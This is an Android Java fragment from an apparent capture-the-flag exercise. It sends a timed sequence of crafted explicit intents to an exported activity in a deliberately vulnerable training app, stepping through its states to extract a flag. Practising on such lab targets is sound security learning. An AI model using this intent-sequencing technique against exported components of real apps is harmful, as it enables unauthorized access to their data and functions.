package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class Flag4Fragment extends Fragment {
    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag4, container, false);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag4);
        launchButton.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag4Activity"));
            // Step 1: PREPARE_ACTION
            Handler handler = new Handler(Looper.getMainLooper());
            handler.postDelayed(() -> {
                intent.setAction("PREPARE_ACTION");
                startActivity(intent);
            }, 0);

            // Step 2: BUILD_ACTION
            handler.postDelayed(() -> {
                intent.setAction("BUILD_ACTION");
                startActivity(intent);
            }, 1000); // 1 second later

            // Step 3: GET_FLAG_ACTION
            handler.postDelayed(() -> {
                intent.setAction("GET_FLAG_ACTION");
                startActivity(intent);
            }, 2000); // 2 seconds later

            // Step 4: null action
            handler.postDelayed(() -> {
                intent.setAction(null);
                startActivity(intent);
            }, 3000); // 3 seconds later
        });
        return view;
    }
} 